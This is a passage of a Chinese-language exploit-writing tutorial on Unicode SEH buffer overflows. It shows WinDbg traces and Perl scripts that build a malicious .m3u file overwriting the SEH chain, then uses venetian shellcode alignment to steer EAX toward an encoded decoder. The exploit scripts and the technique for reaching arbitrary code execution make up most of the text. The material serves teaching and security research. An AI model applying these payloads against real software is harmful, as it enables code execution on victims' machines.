cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50015:
00450015 5b pop ebx
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450016 esp=0012e480 ebp=0012e49c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50016:
00450016 5d pop ebp
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450017 esp=0012e484 ebp=0012e564 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50017:
00450017 c3 ret
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=0012f2ac esp=0012e488 ebp=0012e564 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
+0x12f2ab:
0012f2ac 41 inc ecx
0:000> d eip
0012f2ac 41 00 41 00 15 00 45 00-44 00 44 00 44 00 44 00 A.A...E.D.D.D.D.
0012f2bc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2cc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2dc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2ec 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2fc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f30c 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f31c 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
由上可见pop pop ret被执行了，执行ret之后，跳转到0012f2ac（nseh）。
在nseh的首条指令为0x41（inc ecx），运行该指令后查看eip值，可以看到在nesh是2 A’s（41 00 41 00），后面
是15 00 45 00（=SE Handler）和D’s（来自$morestuff）。在经典的基于SEH的exploit中，我们需使其跳转到
D’s处。现在我们不向nseh中写入跳转代码，而是直接“走”到D’s。为此我们需要：
● 令nseh上的指令相当于nop无效指令；
● 确保SE Handler上的地址（15 00 45 00）即使作为指令来执行，也不会造成任何破坏。
当nseh上的 2 A’s被执行时，情况如下：
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=0012f2ac esp=0012e0c4 ebp=0012e1a0 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
+0x12f2ab:
0012f2ac 41 inc ecx
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450016 edx=7c9032bc esi=00000000 edi=00000000
eip=0012f2ad esp=0012e0c4 ebp=0012e1a0 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
+0x12f2ac:
0012f2ad 004100 add byte ptr [ecx],al ds:0023:00450016=5d
第一条指令可能不会造成什么大的破坏，但第二条指令将引发一个异常，进而又把我们带回了 nSEH，以致无
法正常执行下去。可能这里我还得再使用以下指令：
00 6E 00:add byte ptr [esi],ch
00 6F 00:add byte ptr [edi],ch
00 70 00:add byte ptr [eax],dh
00 71 00:add byte ptr [ecx],dh
00 72 00:add byte ptr [edx],dh
00 73 00:add byte ptr [ebx],dh
像其它指令（62，6d等等）也可工作得很好。
这里我们可以将第一条指令(41= inc eax)替换为popad(=\x61)（它会将一些数据放入所有的寄存器中，这可能会
有利于后面的一些操作）。因此可以用0x610x62覆盖nseh，代码如下：
my $totalsize=5000;
my $junk = "A" x 254;
my $nseh="\x61\x62"; #nseh -> popad + nop/align
my $seh="\x15\x45"; #put 00450015 in SE Handler
my $morestuff="D" x (5000-length($junk.$nseh.$seh));
$payload=$junk.$nseh.$seh.$morestuff;
open(myfile,'>corelantest.m3u');
print myfile $payload;
close(myfile);
print "Wrote ".length($payload)." bytes\n";
结果如下：
0:000> !exchain
0012f2ac: ***
image00400000+50015 (00450015)
Invalid exception stack at 00620061
0:000> bp 00450015
0:000> bp 0012f2ac
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450015 esp=0012e47c ebp=0012e49c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50015:
00450015 5b pop ebx
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450016 esp=0012e480 ebp=0012e49c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50016:
00450016 5d pop ebp
0:000> t
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450017 esp=0012e484 ebp=0012e564 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
image00400000+0x50017:
00450017 c3 ret
0:000> t
Breakpoint 1 hit
eax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=0012f2ac esp=0012e488 ebp=0012e564 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
+0x12f2ab:
0012f2ac 61 popad
0:000> t
eax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580
eip=0012f2ad esp=0012e4a8 ebp=0012f2ac iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
+0x12f2ac:
0012f2ad 006200 add byte ptr [edx],ah ds:0023:0012e54c=b8
0:000> t
eax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580
eip=0012f2b0 esp=0012e4a8 ebp=0012f2ac iopl=0 nv up ei ng nz na po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200283
+0x12f2af:
0012f2b0 1500450044 adc eax,offset +0x440044ff (44004500)
Popad指令将一些数据写入所有的寄存器中，而006200指令相当于nop无操作指令。
注意：在 nseh 上使用单字节指令和类似 nop 的指令通常都可以工作得很好，你还可使用其它单字节指令（inc
,dec ,popad），以达到你所期望的目的。
在上面的反汇编代码中的最后一条指令是由pop/pop/ret地址（15004500）构成的，在右边多了一个
SE Handler之后的数据（44）。00450015中的机器码15被转换成指令adc eax，后面跟着4字节偏移。（栈中接
下来的指令可用于对齐指令，而控制这些字节已不是什么大问题了。）
现在我们试着把pop pop ret这一地址当作指令来执行，如果我们能够执行到其后面的4字节，那么就实现
了与之前在nSEH覆盖跳转指令一样的效果。单步执行（trace）后来到这里：
0:000> t
eax=0012e564 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580
eip=0012f2b0 esp=0012e4a8 ebp=0012f2ac iopl=0 nv up ei ng nz na po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200283
+0x12f2af:
0012f2b0 1500450044 adc eax,offset +0x440044ff (44004500)
0:000> t
eax=44132a65 ebx=0012f2ac ecx=7c90327a edx=0012e54c esi=0012e538 edi=0012e580
eip=0012f2b5 esp=0012e4a8 ebp=0012f2ac iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206
+0x12f2b4:
0012f2b5 00440044 add byte ptr [eax+eax+44h],al ds:0023:8826550e=??
上面已经开始执行覆盖在SEH结构之后的代码了，其中的00440044就是D’s。
结论：
● 覆盖SEH结构；
● 控制EIP（pop pop ret）；
● 模拟shor jump；
● 使程序执行任意代码。
现在下一步的挑战就是编写出有效的exploit。我们不能单纯地将编码的shellcode放在这后面，因为decoder
需要有一个指向自身的寄存器。如果查看当前的寄存器值，会发现大多寄存器都指向当前地址附近的位置，而
没有一个是直接指向当前地址的。因此我们需要修改其中某一寄存器值，并在shellcode前填充一些数据。
假设这里使用的是 eax。我们已经知道如何使用 alpha2 来生成 shellcode 了（只要求使用一个寄存器）。如
果你想使用 vense.pl，就需要多准备一个寄存器，一个指向可写可执行内存地址的寄存器。先用 alpha2 生成代
码，然后让 eax 指向 decoder(=encoded shellcode)的首字节，最后 jmp eax。另外，我们写入的指令必须是兼容
unicode的，因此需要使用到前面提到的venetian shellcode技术。通过查看寄存器，我们发现可以将ebp赋予eax，
然后添加一些字节数，使其跳转到由eax指向的decoder的代码并执行。另外，我们可能需要在这些指令与decoder
之间填充些字节。当我们把ebp赋予eax，并加上100字节后，eax指向0012f3ac，刚好是decoder放置的地方。
我们可以在这个地址上控制数据：
0:000> d 0012f3ac
0012f3ac 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f3bc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
为了将ebp+100赋予eax，然后跳转到eax，我们需要使用以下指令：
push ebp
pop eax
add eax,0x11001400
sub eax,0x11001300
push eax
ret
使用venetian shellcode技术后，在缓冲区中写入如下数据：
my $preparestuff="D"; #we need the first D
$preparestuff=$preparestuff."\x6e"; #nop/align
$preparestuff=$preparestuff."\x55"; #push ebp
$preparestuff=$preparestuff."\x6e"; #nop/align
$preparestuff=$preparestuff."\x58"; #pop eax
$preparestuff=$preparestuff."\x6e"; #pop/align
$preparestuff=$preparestuff."\x05\x14\x11"; #add eax,0x11001400
$preparestuff=$preparestuff."\x6e"; #pop/align
$preparestuff=$preparestuff."\x2d\x13\x11"; #sub eax,0x11001300
$preparestuff=$preparestuff."\x6e"; #pop/align
如上所示，我们还需要放置一个D，因此它是作为在SE Handler上的执行指令的一部分。在这些指令之后，我
们提供将指向0x0012f3ac的eax，然后跳转到eax。
代码如下：
my $totalsize=5000;
my $junk = "A" x 254;
my $nseh="\x61\x62"; #popad + nop
my $seh="\x15\x45"; #put 00450015 in SE Handler
my $preparestuff="D"; #we need the first D
$preparestuff=$preparestuff."\x6e"; #nop/align
$preparestuff=$preparestuff."\x55"; #push ebp
$preparestuff=$preparestuff."\x6e"; #nop/align
$preparestuff=$preparestuff."\x58"; #pop eax
$preparestuff=$preparestuff."\x6e"; #pop/align
$preparestuff=$preparestuff."\x05\x14\x11"; #add eax,0x11001400
$preparestuff=$preparestuff."\x6e"; #pop/align
$preparestuff=$preparestuff."\x2d\x13\x11"; #sub eax,0x11001300
$preparestuff=$preparestuff."\x6e"; #pop/align
my $jump = "\x50"; #push eax
$jump=$jump."\x6d"; #nop/align
$jump=$jump."\xc3"; #ret
my $morestuff="D" x (5000-length($junk.$nseh.$seh.$preparestuff.$jump));
$payload=$junk.$nseh.$seh.$preparestuff.$jump.$morestuff;
open(myfile,'>corelantest.m3u');
print myfile $payload;
close(myfile);